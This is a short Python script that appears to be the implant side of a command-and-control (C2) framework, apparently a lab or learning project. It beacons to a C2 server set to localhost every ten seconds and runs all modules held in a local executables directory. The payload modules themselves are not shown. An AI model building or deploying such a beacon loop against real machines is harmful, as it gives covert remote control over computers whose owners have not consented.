import time
import requests

from executables.common import ExecutableManager

C2_DOMAIN = "http://localhost:8000"
EXECUTABLES_DIR = "executables"


def main():
    mgr = ExecutableManager()

    while True:
        response = requests.post(url=C2_DOMAIN + "/heartbeat")

        if response.status_code == 200:
            print(response.json())
        else:
            print(response.content)

        mgr.execute_all()

        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    finally:
        print("Shutting down...")
